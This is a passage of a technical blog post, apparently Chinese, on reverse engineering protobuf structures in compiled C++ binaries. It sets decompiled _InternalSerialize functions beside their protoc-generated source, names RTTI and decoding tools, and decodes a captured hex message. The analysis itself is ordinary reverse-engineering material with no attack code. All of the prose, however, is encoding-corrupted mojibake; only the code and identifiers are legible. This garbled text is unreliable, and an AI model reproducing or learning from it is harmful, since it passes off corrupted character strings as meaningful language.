&#125;</span><br><span class="line">  v9 = v3;</span><br><span class="line">  sub_14032183F(v11, &amp;unk_14096C300);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç”±äºç¼–è¯‘å¯¼è‡´ä¿¡æ¯ä¸¢å¤±ï¼Œåç¼–è¯‘å¾—åˆ°çš„ä»£ç å’Œæºä»£ç æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œè€Œä¸” protobuf ç»“æ„ç»è¿‡ protoc ç¼–è¯‘ä¹‹åä¼šå˜æˆ C++ ä¸­çš„ä¸€ä¸ªç±»å¯¹è±¡ï¼Œå†ç»è¿‡ C ç¼–è¯‘å™¨å¤„ç†ï¼Œå¤§éƒ¨åˆ†å’ŒåŸå§‹å¯¹è±¡æœ‰å…³çš„ä¿¡æ¯å‡å·²ä¸¢å¤±ã€‚</p>
<p>å’Œ JAVA ä¸­çš„æ€è·¯ç±»ä¼¼ï¼Œå½“ proto å¯¹è±¡æœªé‡‡ç”¨ LITE_RUNTIME æ¨¡å¼ç¼–è¯‘æ—¶ï¼Œ æœ€ç»ˆäºŒè¿›åˆ¶ç¨‹åºå†…éƒ¨åŒ…å«æè¿°ä¿¡æ¯ï¼Œåˆ©ç”¨ pbtk å·¥å…·å³å¯è¿˜åŸåŸå§‹ç»“æ„ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-5.png"
                     
                ></p>
<p>ä½¿ç”¨ from_binary.py è„šæœ¬å¾—åˆ°çš„ç»“æœ</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> mypb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">helloworld</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> _id &#123;</span><br><span class="line">        <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">oneof</span> _str &#123;</span><br><span class="line">        <span class="type">string</span> str = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">oneof</span> _num &#123;</span><br><span class="line">        <span class="type">int32</span> num = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>å½“ç¨‹åºä¸å­˜åœ¨æè¿°ä¿¡æ¯æ—¶ï¼Œå¯ä»¥å°è¯•å¯»æ‰¾ proto å¯¹è±¡çš„ <code>_InternalSerialize</code> å‡½æ•°ã€‚<br>ä»¥æµ‹è¯•é¡¹ç›®ä¸ºä¾‹ï¼Œåœ¨æºä»£ç ä¸­è¿™ä¸ªå‡½æ•°å®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">::<span class="type">uint8_t</span>* helloworld::_InternalSerialize(</span><br><span class="line">    ::<span class="type">uint8_t</span>* target,</span><br><span class="line">    ::google::protobuf::io::EpsCopyOutputStream* stream) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_start:mypb.helloworld)</span></span><br><span class="line">  ::<span class="type">uint32_t</span> cached_has_bits = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>)cached_has_bits;</span><br><span class="line"></span><br><span class="line">  cached_has_bits = _impl_._has_bits_[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// optional int32 id = 1;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000002</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">1</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_id(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional string str = 2;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000001</span>u) &#123;</span><br><span class="line">    <span class="type">const</span> std::string&amp; _s = <span class="keyword">this</span>-&gt;_internal_str();</span><br><span class="line">    ::google::protobuf::internal::WireFormatLite::<span class="built_in">VerifyUtf8String</span>(</span><br><span class="line">        _s.<span class="built_in">data</span>(), <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(_s.<span class="built_in">length</span>()), ::google::protobuf::internal::WireFormatLite::SERIALIZE, <span class="string">&quot;mypb.helloworld.str&quot;</span>);</span><br><span class="line">    target = stream-&gt;<span class="built_in">WriteStringMaybeAliased</span>(<span class="number">2</span>, _s, target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional int32 num = 3;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000004</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">3</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_num(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">PROTOBUF_PREDICT_FALSE</span>(_internal_metadata_.<span class="built_in">have_unknown_fields</span>())) &#123;</span><br><span class="line">    target =</span><br><span class="line">        ::_pbi::WireFormat::<span class="built_in">InternalSerializeUnknownFieldsToArray</span>(</span><br><span class="line">            _internal_metadata_.<span class="built_in">unknown_fields</span>&lt;::google::protobuf::UnknownFieldSet&gt;(::google::protobuf::UnknownFieldSet::default_instance), target, stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_end:mypb.helloworld)</span></span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°ä¸­é€šè¿‡ cached_has_bits æ¥åˆ¤æ–­å½“å‰å¤„ç†çš„æ˜¯å“ªä¸ªæˆå‘˜ï¼Œåç»­çš„ WireFormatLite::xxx å‡½æ•°ä¸­åˆåŒ…å«å½“å‰å­—æ®µåœ¨åŸå§‹å®šä¹‰ä¸­çš„é¡ºåºã€‚</p>
<p>ä¸ºäº†æ‰¾åˆ° <code>_InternalSerialize</code> å‡½æ•°ï¼Œé¦–å…ˆè¦åœ¨ç¨‹åºä¸­å®šä½ proto å¯¹è±¡ä½ç½®ï¼ŒC++ ç¨‹åºä¸­å¯èƒ½ä¼šç•™ä¸‹å¾ˆå¤š RTTI ç»“æ„ï¼ŒRTTI æ˜¯ C++ ä¸­çš„ä¸€ç§ç‰¹æ€§ï¼Œå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶å¾—çŸ¥æŸä¸ªå¯¹è±¡çš„ä¿¡æ¯ã€‚ä½¿ç”¨å¼€æºå·¥å…· <a class="link"   href="https://github.com/rcx/classinformer-ida7" >https://github.com/rcx/classinformer-ida7<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> å¯ä»¥ä»ç¨‹åºä¸­å°è¯•è¿˜åŸè¿™äº›ä¿¡æ¯ã€‚<br>åœ¨ testProto ä¸Šæ‰§è¡Œè¿™ä¸ªæ’ä»¶å¾—åˆ°ç»“æœ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-6.png"
                     
                ></p>
<p>æ’ä»¶æˆåŠŸè¯†åˆ«åˆ°äº† helloworld proto å¯¹è±¡ï¼ŒåŒå‡»æ¥åˆ°å¯¹è±¡ä½ç½®ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ 17 ä¸ªæ–¹æ³•</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-7.png"
                     
                ></p>
<p>ä¾æ¬¡åˆ†æå„ä¸ªå‡½æ•°å°±èƒ½æ‰¾åˆ° <code>_InternalSerialize</code> å‡½æ•°</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_14035EAB0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+118h] [rbp+F8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140326B0A</span>(&amp;unk_140CD02D2);</span><br><span class="line">  v8 = *<span class="built_in">sub_140325A98</span>(a1 + <span class="number">16</span>, <span class="number">0</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">sub_140309F23</span>(a1);</span><br><span class="line">    a2 = <span class="built_in">sub_14032414D</span>(a3, v3, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">sub_1403293E6</span>(a1);</span><br><span class="line">    v10 = <span class="built_in">sub_14032223A</span>(v9);</span><br><span class="line">    v4 = <span class="built_in">sub_140315D46</span>(v9);</span><br><span class="line">    <span class="built_in">sub_14030AC2A</span>(v4, v10, <span class="number">1</span>i64, <span class="string">&quot;mypb.helloworld.str&quot;</span>);</span><br><span class="line">    a2 = <span class="built_in">sub_140314E96</span>(a3, <span class="number">2</span>i64, v9, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">sub_140322CD5</span>(a1);</span><br><span class="line">    a2 = <span class="built_in">sub_1403140EF</span>(a3, v5, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_14032560B</span>(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">sub_1403171AA</span>(a1 + <span class="number">8</span>, sub_14031FF6C);</span><br><span class="line">    a2 = <span class="built_in">sub_14031A611</span>(v6, a2, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹ç…§æºä»£ç </p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">::<span class="type">uint8_t</span>* helloworld::_InternalSerialize(</span><br><span class="line">    ::<span class="type">uint8_t</span>* target,</span><br><span class="line">    ::google::protobuf::io::EpsCopyOutputStream* stream) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_start:mypb.helloworld)</span></span><br><span class="line">  ::<span class="type">uint32_t</span> cached_has_bits = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>)cached_has_bits;</span><br><span class="line"></span><br><span class="line">  cached_has_bits = _impl_._has_bits_[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// optional int32 id = 1;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000002</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">1</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_id(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional string str = 2;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000001</span>u) &#123;</span><br><span class="line">    <span class="type">const</span> std::string&amp; _s = <span class="keyword">this</span>-&gt;_internal_str();</span><br><span class="line">    ::google::protobuf::internal::WireFormatLite::<span class="built_in">VerifyUtf8String</span>(</span><br><span class="line">        _s.<span class="built_in">data</span>(), <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(_s.<span class="built_in">length</span>()), ::google::protobuf::internal::WireFormatLite::SERIALIZE, <span class="string">&quot;mypb.helloworld.str&quot;</span>);</span><br><span class="line">    target = stream-&gt;<span class="built_in">WriteStringMaybeAliased</span>(<span class="number">2</span>, _s, target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional int32 num = 3;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000004</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">3</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_num(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">PROTOBUF_PREDICT_FALSE</span>(_internal_metadata_.<span class="built_in">have_unknown_fields</span>())) &#123;</span><br><span class="line">    target =</span><br><span class="line">        ::_pbi::WireFormat::<span class="built_in">InternalSerializeUnknownFieldsToArray</span>(</span><br><span class="line">            _internal_metadata_.<span class="built_in">unknown_fields</span>&lt;::google::protobuf::UnknownFieldSet&gt;(::google::protobuf::UnknownFieldSet::default_instance), target, stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_end:mypb.helloworld)</span></span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åç¼–è¯‘å‡½æ•°å’Œæºä»£ç å¤§ä½“ä¸€è‡´ï¼Œé¦–å…ˆï¼Œé€šè¿‡å˜é‡ v8(å³ cached_has_bits) æˆ‘ä»¬çŸ¥é“è¿™ä¸ª protobuf å¯¹è±¡åº”è¯¥æœ‰ 3 ä¸ªæˆå‘˜ï¼Œæ¥ç€è¦å¯»æ‰¾æˆå‘˜ IDï¼Œå¯¹äº INT32 å®šä¹‰ï¼Œæ¯”å¦‚ id æˆå‘˜ï¼Œåœ¨åç¼–è¯‘ä¸­å¯¹åº” v8 &amp; 2 åˆ†æ”¯ï¼Œè¿›å…¥ sub_14032414D å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_14032414D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_14035FBF0(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å†è¿›å…¥ sub_14035FBF0 å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_14035FBF0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+110h] [rbp+F0h]</span></span><br><span class="line"></span><br><span class="line">  sub_140326B0A(&amp;unk_140CD0295);</span><br><span class="line">  v7 = sub_14030A65D(a1, a3);</span><br><span class="line">  <span class="keyword">return</span> sub_14031923E(<span class="number">1</span>i64, a2, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ° sub_14031923E çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 1ã€‚</p>
<p>å†ç”¨ num æˆå‘˜æ¥éªŒè¯ï¼Œè¿›å…¥ sub_1403140EF å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_1403140EF</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_14035FC70(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å†è¿›å…¥ sub_14035FC70 å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_14035FC70</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+110h] [rbp+F0h]</span></span><br><span class="line"></span><br><span class="line">  sub_140326B0A(&amp;unk_140CD0295);</span><br><span class="line">  v7 = sub_14030A65D(a1, a3);</span><br><span class="line">  <span class="keyword">return</span> sub_14031923E(<span class="number">3</span>i64, a2, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>sub_14031923E å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 3ï¼Œç¬¦åˆåŸå§‹å®šä¹‰ã€‚</p>
<p>è€Œå¯¹äº str å‚æ•°ï¼Œåœ¨å¤–éƒ¨çš„ sub_140314E96 å‡½æ•°ä¸­å°±å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸º 2ï¼Œè¯´æ˜å®ƒçš„ ID ä¸º 2ã€‚<br>æ³¨æ„åˆ°å½“æˆå‘˜çš„ç±»å‹ä¸åŒæ—¶ï¼Œä»£ç ä¸­ä¼šå­˜åœ¨ä¸åŒçš„å®šä¹‰æ–¹æ³•ï¼Œå®é™…å¯èƒ½è¦è€ƒè™‘å¤šæ–¹æƒ…å†µã€‚è¿™ç§æ–¹å¼å¯ä»¥åœ¨ç¼ºå°‘åŸå§‹ç»“æ„ä¿¡æ¯æ—¶ä½œä¸ºè¾…åŠ©æ€è·¯ï¼Œç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ— æ³•å¾—çŸ¥æˆå‘˜çš„åç§°ï¼Œä¸”åˆ¤æ–­æˆå‘˜ç±»å‹æ—¶è¿˜éœ€è¦åˆ†æå…·ä½“å‡½æ•°ã€‚</p>
<p>æˆ‘ä»¬å†ä»¥æŸç¬¬ä¸‰æ–¹ç¨‹åºä¸ºä¾‹ï¼Œæ­¤ç¨‹åºç”± C++ ç¼–å†™ï¼Œä½¿ç”¨äº† protobufï¼Œä¸”ç¨‹åºä¸­ä¸å­˜åœ¨æè¿°ä¿¡æ¯ã€‚</p>
<p>é¦–å…ˆä½¿ç”¨ classinformer æ’ä»¶æ‰¾åˆ°æ„Ÿå…´è¶£çš„ proto å¯¹è±¡ï¼Œä¾‹å¦‚ UpdateProto</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-8.png"
                     
                ></p>
<p>ä¾æ¬¡åˆ†æè¿™äº›å‡½æ•°ï¼Œæ‰¾åˆ° <code>_InternalSerialize</code> å¯¹åº”å‡½æ•° sub_466A60</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">_BYTE *__thiscall <span class="title">sub_466A60</span><span class="params">(_DWORD *<span class="keyword">this</span>, _BYTE *a2, _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="keyword">this</span>[<span class="number">2</span>];</span><br><span class="line">  v15 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )                          <span class="comment">// 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt;= *a3 )</span><br><span class="line">      v5 = <span class="built_in">sub_477210</span>(a2);</span><br><span class="line">    v6 = <span class="keyword">this</span>[<span class="number">6</span>];</span><br><span class="line">    *v5 = <span class="number">8</span>;                                    <span class="comment">// 1 * 8 = 8, index = 1</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v6, v6 &gt;&gt; <span class="number">31</span>, v5 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">8</span>) != <span class="number">0</span> )                          <span class="comment">// 2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= *a3 )</span><br><span class="line">      v7 = <span class="built_in">sub_477210</span>(v7);</span><br><span class="line">    v11 = <span class="keyword">this</span>[<span class="number">7</span>];</span><br><span class="line">    *v7 = <span class="number">16</span>;                                   <span class="comment">// 2 * 8 = 16, index = 2</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v11, <span class="built_in">HIDWORD</span>(v11), v7 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )                          <span class="comment">// 3</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (mk_string)(<span class="number">3</span>, (<span class="keyword">this</span>[<span class="number">4</span>] &amp; <span class="number">0xFFFFFFFE</span>), v7);<span class="comment">// index = 3</span></span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">2</span>) != <span class="number">0</span> )                          <span class="comment">// 4</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (mk_string)(<span class="number">4</span>, (<span class="keyword">this</span>[<span class="number">5</span>] &amp; <span class="number">0xFFFFFFFE</span>), v7);<span class="comment">// index = 4</span></span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">16</span>) != <span class="number">0</span> )                         <span class="comment">// 5</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= *a3 )</span><br><span class="line">      v7 = <span class="built_in">sub_477210</span>(v7);</span><br><span class="line">    v14 = <span class="keyword">this</span>[<span class="number">9</span>];</span><br><span class="line">    v12 = <span class="keyword">this</span>[<span class="number">8</span>];</span><br><span class="line">    *v7 = <span class="number">0x28</span>;                                 <span class="comment">// 5 * 8 = 40, index = 5</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v12, v14, v7 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">32</span>) != <span class="number">0</span> )                         <span class="comment">// 6</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= *a3 )</span><br><span class="line">      v7 = <span class="built_in">sub_477210</span>(v7);</span><br><span class="line">    v13 = <span class="keyword">this</span>[<span class="number">10</span>];</span><br><span class="line">    *v7 = <span class="number">48</span>;                                   <span class="comment">// 6 * 8 = 48, index = 6</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v13, <span class="built_in">HIDWORD</span>(v13), v7 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *((<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">20</span>);</span><br><span class="line">    v16 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = ((<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !byte_4B07A8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_476550</span>();</span><br><span class="line">        v8 = v16;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = &amp;xmmword_4B07B0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(v9 + <span class="number">5</span>) &gt;= <span class="number">0x10</span>u )</span><br><span class="line">      v9 = *v9;</span><br><span class="line">    <span class="keyword">if</span> ( *a3 - v7 &lt; v8 )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">sub_477480</span>(v9, v8, v7);</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, v9, v8);</span><br><span class="line">    v7 += v16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‚è€ƒæºä»£ç ä¸­ <code>_InternalSerialize</code> å‡½æ•°çš„åŸºæœ¬ç»“æ„ï¼Œåˆ†æå¾—çŸ¥è¯¥å¯¹è±¡åº”è¯¥å…·æœ‰ 6 ä¸ªå˜é‡ï¼Œå…¶ä¸­ 1ã€2ã€5ã€6 å·å˜é‡ä¸º int ç±»å‹ï¼Œ3ã€4 å·å˜é‡åº”ä¸º string ç±»å‹ã€‚æ„é€ ä¸€ä¸ªåŸºæœ¬çš„å¯¹è±¡æ•°æ®å¹¶ä¼ å…¥ç¨‹åºï¼Œé€šè¿‡è°ƒè¯•å¯ä»¥éªŒè¯ä»¥ä¸Šåˆ†ææ˜¯æ­£ç¡®çš„ã€‚</p>
<h2 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h2><p>æŸäº›æƒ…å†µä¸‹èƒ½å¾—åˆ°ç¨‹åºæ‰€ä½¿ç”¨çš„ protobuf æ•°æ®ï¼Œæ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œå‡è®¾é€šè¿‡æŠ“åŒ…ç­‰æ–¹å¼è·å–äº†ç¨‹åºé€šè®¯è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ•°æ®</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">08 01 10 02 1a 0b 74 65 73 74 53 74 72 69 6e 67 31 22 0b 74 65 73 74 53 74 72 69 6e 67 32 28 05 30 06</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶å¯ä»¥ç”¨ä¸€äº›<a class="link"   href="https://protobuf-decoder.netlify.app/" >å·¥å…·<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ç›´æ¥å°†å…¶è§£æ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-9.png"
                     
                ></p>
<p>æ ¹æ®ç¨‹åºé€»è¾‘ä¸æ–­è°ƒæ•´æ•°æ®ä¹Ÿè®¸å°±èƒ½çŒœæµ‹å‡ºå„ä¸ªå­—æ®µçš„åŠŸèƒ½ï¼Œè€Œæ— éœ€åŸå§‹ proto å¯¹è±¡å®šä¹‰ã€‚</p>
<p>æœ¬æ–‡ä»‹ç»äº†åœ¨é€†å‘è¿‡ç¨‹ä¸­è¿˜åŸ protobuf å¯¹è±¡çš„å‡ ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ¯”è¾ƒé€šç”¨çš„æ€è·¯å°±æ˜¯ä½¿ç”¨å¯¹åº”è¯­è¨€å…ˆç¼–è¯‘ä¸€ä¸ªç®€å•ä¸”å·²çŸ¥çš„å¯¹è±¡ï¼Œç„¶åä»ç”Ÿæˆçš„æºä»£ç ä¸­æ‰¾åˆ°èƒ½å¤Ÿè¯†åˆ«å¯¹è±¡çš„ä¸€äº›ç‰¹å¾ï¼Œå†åº”ç”¨åˆ°å¾…åˆ†æç¨‹åºä¸­å°è¯•æ¢å¤å¯¹è±¡ç»“æ„ï¼Œæˆ–è€…ç›´æ¥æŠ“åŒ…å¹¶è°ƒè¯•ç›®æ ‡ç¨‹åºæ¥è¾…åŠ©åˆ†æã€‚</p>
